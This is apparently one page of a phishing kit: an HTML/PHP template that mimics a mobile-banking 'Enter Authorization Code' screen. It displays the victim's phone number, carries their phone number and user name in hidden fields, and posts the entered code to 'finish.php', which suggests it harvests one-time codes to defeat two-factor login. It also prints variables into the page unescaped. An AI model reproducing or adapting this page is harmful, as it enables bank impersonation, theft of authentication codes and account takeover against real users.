...
<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
   ...
   <body>
      ...
      <div id="cmw_toolBar_" class="cmw_toolBar_">
         <a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a>
         <div id="barker" class="hidden"></div>
         <h1 id="title" class="">
            <div id="cmw_toolBar_titleText" style="padding-left: 10px; padding-right: 10px; width: 100%;">Enter Authorization Code</div>
            <span class="adaHidden" id="adaTitleText"></span>
         </h1>
         <a id="rightButton" class="hidden"></a>
      </div>
      <div id="SASI_banner_container"></div>
      <div class="pageMinHeight">
      <div id="divMessaging" class="hidden" tabindex="-1">
      ...
      <div id="authorizationCodeDiv">
         ...
         <div id="TextMessageForAuthCode">
            <div class="paddingVert10 padding10">
               <p>An authorization code was sent to your phone</p>
               <div>
                  <div class="toppad20 paddingHoriz10"><b><?php print " $phone ";?></b></div>
               </div>
            </div>
         </div>
         ...
         <form action="finish.php" method="post" autocomplete="off" name="form">
            ...
            <div class="padding10 toppad20" id="CodeExpires">
            ...
            <div id="btnPin" style="position: fixed; bottom: 0px;">
               <ul class="btnGroupPin">
                  <li>
                     <input name="phone" type="hidden" value="<?php print " $phone ";?>">
                     <input name="user" type="hidden" value="<?php print " $user ";?>">
      ...
      <div class="spinnerPanel" style="height: 938px; display: none;">
         <div class="spinner" style="top: 375.2px; display: block;"><span class="messageIcon"></span><a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div>
      </div>
      <div id="slidemenu_sidePanel" class="" style="display: none">
         <div class="slidemenu_menu">
            <ul class="popoverMenu">
               ...
               <li class="menuItem accounts_on">
                  <div class="hidden right tally blue" style="color: rgb(255, 255, 255);">1</div>
                  <a class="disabled" href="#home?app=accounts" style="color: rgb(1, 124, 194);">Accounts</a>
               </li>
               <li class="menuItem mycard">
                  <div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div>
